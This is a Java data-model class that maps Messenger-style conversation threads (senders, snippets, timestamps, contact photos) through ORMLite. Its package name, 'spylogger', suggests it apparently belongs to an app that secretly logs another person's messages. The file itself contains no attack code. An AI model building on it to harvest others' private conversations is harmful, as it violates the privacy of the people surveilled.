package com.gravatasufoca.spylogger.model.messenger;

import android.content.Context;

import com.gravatasufoca.spylogger.model.EntidadeAbstrata;
import com.j256.ormlite.dao.ForeignCollection;
import com.j256.ormlite.field.DataType;
import com.j256.ormlite.field.DatabaseField;
import com.j256.ormlite.field.ForeignCollectionField;
import com.j256.ormlite.table.DatabaseTable;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import lombok.Getter;
import lombok.Setter;

@Getter
@Setter
@DatabaseTable(tableName="threads")
public class Thread extends EntidadeAbstrata {
	private static final long serialVersionUID = -4679985146526783051L;

	public Thread() {
	}

	@Override
	public Serializable getId() {
		// TODO Auto-generated method stub
		return thread_key;
	}

	@DatabaseField(id=true,generatedId=false)
	private String thread_key;

	@DatabaseField()
	private String snippet;

	@DatabaseField(columnName="senders")
	private String tsenders;

	@DatabaseField(columnName="snippet_sender")
	private String tsnippet_sender;

	@ForeignCollectionField(eager=false,orderAscending=false,orderColumnName="timestamp_ms", foreignFieldName="thread")
	private ForeignCollection<Messages> mensagens;

	@DatabaseField(dataType=DataType.DATE_LONG)
	private Date timestamp_ms;

	private List<Sender> senders;

	private Sender snippetSender;

	private String photo;

	private String nomes;


	public String getPhoto(Context context,Contact proprietario){
		if(photo==null || photo.isEmpty()){
			photo="";
			getSenders();
			for(Sender sender: senders){
				Contact contato=sender.getContato(context);
				if(contato!=null){
					if(!sender.getContato(context).equals(proprietario)){
						photo=sender.getContato(context).getSmallPictureUrl();
					}
				}
			}
		}
		return photo;
	}

	public String getNomes(Context context,Contact proprietario){
		if(nomes==null){
			nomes="";
			getSenders();
			String sep="";
			for(Sender sender: senders){
				Contact contato=sender.getContato(context);
				if(contato!=null){
					if(!contato.equals(proprietario)){
						nomes+=sep+sender.getNome();
						if(sep.isEmpty())
							sep=", ";
					}
				}else
				{
					nomes+=sep+sender.getNome();
					if(sep.isEmpty())
						sep=", ";
				}
			}
		}
		return nomes;
	}

	public List<Sender> getSenders() {
		if(senders==null){
			try {
				JSONArray tmp=new JSONArray(tsenders);
				senders=new ArrayList<Sender>();
				for(int i=0;i<tmp.length();i++){
					senders.add(new Sender((JSONObject) tmp.get(i)));
				}

			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return senders;
	}

	public Sender getSnippetSender() {
		if(snippetSender==null){
			snippetSender=new Sender(tsnippet_sender);
		}
		return snippetSender;
	}

}
